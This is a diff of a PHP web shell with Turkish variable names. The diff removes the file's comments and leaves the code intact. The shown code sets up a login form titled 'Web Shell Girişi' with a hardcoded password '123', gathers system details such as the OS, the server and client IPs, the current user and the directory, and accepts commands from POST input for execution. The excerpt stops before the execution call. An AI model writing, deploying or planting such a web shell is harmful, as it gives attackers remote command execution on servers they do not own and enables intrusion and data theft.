@@ -1,14 +1,14 @@
 <?php
-// Oturum başlatma
+ 
 session_start();
 
-// Şifre ile koruma
+ 
 $sifre = "123";
 
-// Eğer kullanıcı şifreyi doğru girmezse, giriş formunu göster
+ 
 if (!isset($_SESSION['giris']) || $_SESSION['giris'] !== true) {
     if (isset($_POST['sifre']) && $_POST['sifre'] === $sifre) {
-        $_SESSION['giris'] = true; // Başarılı giriş durumunda oturumu aç
+        $_SESSION['giris'] = true;  
     } else {
         echo '<form method="post">
             <h3>Web Shell Girişi</h3>
@@ -19,14 +19,14 @@ if (!isset($_SESSION['giris']) || $_SESSION['giris'] !== true) {
     }
 }
 
-// Sistem bilgilerini toplama
+ 
 $isletim_sistemi = php_uname();
 $sunucu_ip = $_SERVER['SERVER_ADDR'] ?? 'Bilinmiyor';
 $kullanici_ip = $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor';
 $mevcut_kullanici = get_current_user();
 $mevcut_dizin = getcwd();
 
-// Komut çalıştırma
+ 
 $cikti = '';
 $helpText = [
     'ls' => 'Listeleme komutudur. Kullanımı: ls [dizin]',
@@ -39,7 +39,7 @@ $helpText = [
 if (isset($_POST['komut']) && !empty($_POST['komut'])) {
     $komut = trim($_POST['komut']);
     
-    // Yardım komutu
+   
     if ($komut === 'help') {
         $cikti = implode("\n", array_map(fn($key, $value) => "$key: $value", array_keys($helpText), $helpText));
     } else {
